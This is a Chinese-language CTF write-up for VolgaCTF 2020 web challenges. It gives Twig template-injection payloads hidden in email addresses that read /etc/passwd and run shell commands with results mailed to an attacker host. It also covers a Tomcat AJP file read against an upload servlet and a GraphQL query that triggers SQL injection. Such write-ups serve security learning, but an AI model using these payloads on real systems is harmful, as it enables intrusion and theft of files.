categories:
- 比赛
tags:
- wp
- ctf
title: volgactf
---
# volgactf

## web

### Newsletter

源码

```php
<?php
namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Mailer\MailerInterface;
use Symfony\Component\Mime\Email;

class MainController extends AbstractController
{
    public function index(Request $request)
    {
      return $this->render('main.twig');
    }

    public function subscribe(Request $request, MailerInterface $mailer)
    {
      $msg = '';
      $email = filter_var($request->request->get('email', ''), FILTER_VALIDATE_EMAIL);
      if($email !== FALSE) {
        $name = substr($email, 0, strpos($email, '@'));

        $content = $this->get('twig')->createTemplate(
          "<p>Hello ${name}.</p><p>Thank you for subscribing to our newsletter.</p><p>Regards, VolgaCTF Team</p>"
        )->render();###这里

        $mail = (new Email())->from('newsletter@newsletter.q.2020.volgactf.ru')->to($email)->subject('VolgaCTF Newsletter')->html($content);
        $mailer->send($mail);

        $msg = 'Success';
      } else {
        $msg = 'Invalid email';
      }
      return $this->render('main.twig', ['msg' => $msg]);
    }


    public function source()
    {
        return new Response('<pre>'.htmlspecialchars(file_get_contents(__FILE__)).'</pre>');
    }
}
```
我们很容易知道这里存在ssti,但是有两个问题:

1. FILTER_VALIDATE_EMAIL验证
2. 如何接收结果

第二个问题不难解决,直接用自己的vps接受就可以,第一个问题通过查询维基百科也可以构造出payload,但是payload却有长度限制,最多只能有64个字符,通常的twig ssti的payload是无法直接用的了,需要我们自己挖掘

https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly
https://en.wikipedia.org/wiki/Email_address



`python -m smtpd -n -c DebuggingServer 0.0.0.0:25`

以下是我挖掘发现的payload,最后还是没能做出来,原因是自己查询的版本和题目的版本不一样

```php

"{{app.request}}"@ccreater.top
"{{app.environment}}"%40ccreater.top  : prod
"{{app.request.request.get('name')}}"@[47.107.171.219]
email="{{render(controller(app.request.request.get('a')))}}"@ccreater.top&a=App\Controller\MainController::source


"{{render(controller(app.request.query.get(1),{'file':'flag'}))}}"@ccreater.top 1=Symfony\Bundle\FrameworkBundle\Controller::file
文件名最长只能4个,并没有读到flag
```


以下是wp提供的payload


https://symfony.com/doc/current/reference/twig_reference.html#file-excerpt


```
email="{{'/etc/passwd'|file_excerpt(1,30)}}"@attacker.tld




POST /subscribe?0=cat+/etc/passwd HTTP/1.1
Host: newsletter.q.2020.volgactf.ru
Content-Type: application/x-www-form-urlencoded

email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
```

https://twig.symfony.com/doc/3.x/functions/constant.html
VolgaCTF_6751602deea2a308ab611eeef7a4e961
https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html?m=1

其中有一个filter_var来命令执行实在是让我惊讶

### NetCorp

这题挺简单的,但是我还是搞了好久,对jsp和题目的cve一点都不熟悉,搞得我写个payload都百度半天

端口扫描发现:

```
8009/tcp open     ajp13
9090/tcp open     zeus-admin
```

tomcat ajp前段时间刚好出了个文件读取/包含的漏洞

试了一下,确实存在这个洞

先读取/WEB-INF/web.xml

```xml
<!DOCTYPE web-app PUBLIC
 "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
 "http://java.sun.com/dtd/web-app_2_3.dtd" >

<web-app>
  <display-name>NetCorp</display-name>


  <servlet>
        <servlet-name>ServeScreenshot</servlet-name>
        <display-name>ServeScreenshot</display-name>
        <servlet-class>ru.volgactf.netcorp.ServeScreenshotServlet</servlet-class>
  </servlet>

  <servlet-mapping>
        <servlet-name>ServeScreenshot</servlet-name>
        <url-pattern>/ServeScreenshot</url-pattern>
  </servlet-mapping>


        <servlet>
                <servlet-name>ServeComplaint</servlet-name>
                <display-name>ServeComplaint</display-name>
                <description>Complaint info</description>
                <servlet-class>ru.volgactf.netcorp.ServeComplaintServlet</servlet-class>
        </servlet>

        <servlet-mapping>
                <servlet-name>ServeComplaint</servlet-name>
                <url-pattern>/ServeComplaint</url-pattern>
        </servlet-mapping>

        <error-page>
                <error-code>404</error-code>
                <location>/404.html</location>
        </error-page>



</web-app>
```

再读取其他的class文件,其中发现一个上传点

```java

package ru.volgactf.netcorp;

import java.io.*;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Collection;
import java.util.Iterator;
import javax.servlet.*;
import javax.servlet.http.*;

public class ServeScreenshotServlet extends HttpServlet
{

    public ServeScreenshotServlet()
    {
        System.out.println("ServeScreenshotServlet Constructor called!");
    }

    public void init(ServletConfig config)
        throws ServletException
    {
        System.out.println("ServeScreenshotServlet \"Init\" method called");
    }

    public void destroy()
    {
        System.out.println("ServeScreenshotServlet \"Destroy\" method called");
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException
    {
        String appPath = request.getServletContext().getRealPath("");
        String savePath = (new StringBuilder()).append(appPath).append("uploads").toString();
        File fileSaveDir = new File(savePath);
        if(!fileSaveDir.exists())
            fileSaveDir.mkdir();
        String submut = request.getParameter("submit");
        if(submut != null)
            if(submut.equals("true"));
        PrintWriter out = request.getParts().iterator();
        do
        {
            if(!out.hasNext())
                break;
            Part part = (Part)out.next();
            String fileName = extractFileName(part);
            fileName = (new File(fileName)).getName();
            String hashedFileName = generateFileName(fileName);
            String path = (new StringBuilder()).append(savePath).append(File.separator).append(hashedFileName).toString();
            if(!path.equals("Error"))
                part.write(path);
        } while(true);
        out = response.getWriter();
        response.setContentType("application/json");
        response.setCharacterEncoding("UTF-8");
        out.print(String.format("{'success':'%s'}", new Object[] {
            "true"
        }));
        out.flush();
    }

    private String generateFileName(String fileName)
    {
        String s2;
        StringBuilder sb;
        MessageDigest md = MessageDigest.getInstance("MD5");
        md.update(fileName.getBytes());
        byte digest[] = md.digest();
        s2 = (new BigInteger(1, digest)).toString(16);
        sb = new StringBuilder(32);
        int i = 0;
        for(int count = 32 - s2.length(); i < count; i++)
            sb.append("0");

        return sb.append(s2).toString();
        NoSuchAlgorithmException e;
        e;
        e.printStackTrace();
        return "Error";
    }

    private String extractFileName(Part part)
    {
        String contentDisp = part.getHeader("content-disposition");
        String items[] = contentDisp.split(";");
        String as[] = items;
        int i = as.length;
        for(int j = 0; j < i; j++)
        {
            String s = as[j];
            if(s.trim().startsWith("filename"))
                return s.substring(s.indexOf("=") + 2, s.length() - 1);
        }

        return "";
    }

    private static final String SAVE_DIR = "uploads";
}
```

于是问题解决了

### Library

这题有点意思,让我接触了一个新的查询语言 Graphql 

先是通过报错获知了后端是nodejs,又通过报错得知了api是Graphql 

[PayloadsAllTheThings GraphQL]( https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL Injection )

看了他们的官方文档,英文看的头都痛了,才了解一些(平常翘英语课的后果//)

根据他们的例子找到了一个奇怪的query name

```json
 					"name": "testGetUsersByFilter",
                            "description": "",
                            "args": [
                                {
                                    "name": "filter",
                                    "description": "",
                                    "type": {
                                        "kind": "INPUT_OBJECT",
                                        "name": "UserFilter",
                                        "ofType": null
                                    },
                                    "defaultValue": null
                                }
                            ],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "OBJECT",
                                    "name": "User",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
```

妥妥的薄弱点
构造
```
query testGetUsersByFilter($input: UserFilter){
    testGetUsersByFilter(filter:$input) {
        name
        login
        email
    }
    
}
{"input":{"login":"\\","name":" a","email":""}}
```
返回提示数据库错误,sql注入get



### User Center

 https://spotless.tech/volgactf-2020-qualifier-user-center.html 

总结:不同浏览器解析http报文的方式不同

子域可以修改域的cookie